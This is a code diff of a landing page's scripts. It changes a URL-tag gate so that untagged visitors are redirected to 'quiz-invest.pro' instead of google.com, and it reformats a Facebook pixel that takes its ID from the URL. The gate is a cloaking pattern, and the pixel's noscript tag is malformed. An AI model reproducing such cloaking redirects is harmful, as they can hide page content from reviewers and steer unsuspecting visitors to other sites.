@@ -46,7 +46,7 @@
     <script>
       if (document.location.href.indexOf("ag=m777kd") == -1 && localStorage.getItem('egID') != 'ag=m777kd') {
         // document.location.href = 'google.com'
-        window.location.href = 'https://www.google.com';
+        window.location.href = 'https://quiz-invest.pro';
       } else {
         localStorage.setItem('egID', 'ag=m777kd');
       }
@@ -66,45 +66,33 @@
       })("https://widget.replain.cc/dist/client.js");
     </script>
 
-    <script>
-      function getParameterByName() {
-        let url = window.location.href;
-
-        return url.split("id=")[1] || "";
-      }
-
+<script>
+  function getParameterByName() {
+      let url = window.location.href;
+      
+      return url.split('id=')[1] || '';
+    }
+    
       var pixelId = getParameterByName();
-      console.log("pixelId", pixelId);
-      localStorage.setItem("Id", pixelId);
+      console.log('pixelId', pixelId);
+      localStorage.setItem('Id', pixelId);
 
-      !(function (f, b, e, v, n, t, s) {
-        if (f.fbq) return;
-        n = f.fbq = function () {
-          n.callMethod
-            ? n.callMethod.apply(n, arguments)
-            : n.queue.push(arguments);
-        };
-        if (!f._fbq) f._fbq = n;
-        n.push = n;
-        n.loaded = !0;
-        n.version = "2.0";
-        n.queue = [];
-        t = b.createElement(e);
-        t.async = !0;
-        t.src = v;
-        s = b.getElementsByTagName(e)[0];
-        s.parentNode.insertBefore(t, s);
-      })(
-        window,
-        document,
-        "script",
-        "https://connect.facebook.net/en_US/fbevents.js"
-      );
-      fbq("init", pixelId);
-    </script>
-    <noscript>
-      <img height="1" width="1" style="display:none"
-      src="https://www.facebook.com/tr?id=" + pixelId + "&ev=Lead&noscript=1"/>
-    </noscript>
+        !function(f,b,e,v,n,t,s)
+        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+        n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s)}(window, document,'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', pixelId);
+        
+      
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=" + pixelId + "&ev=Lead&noscript=1"/>
+  </noscript>
+
   </body>
 </html>
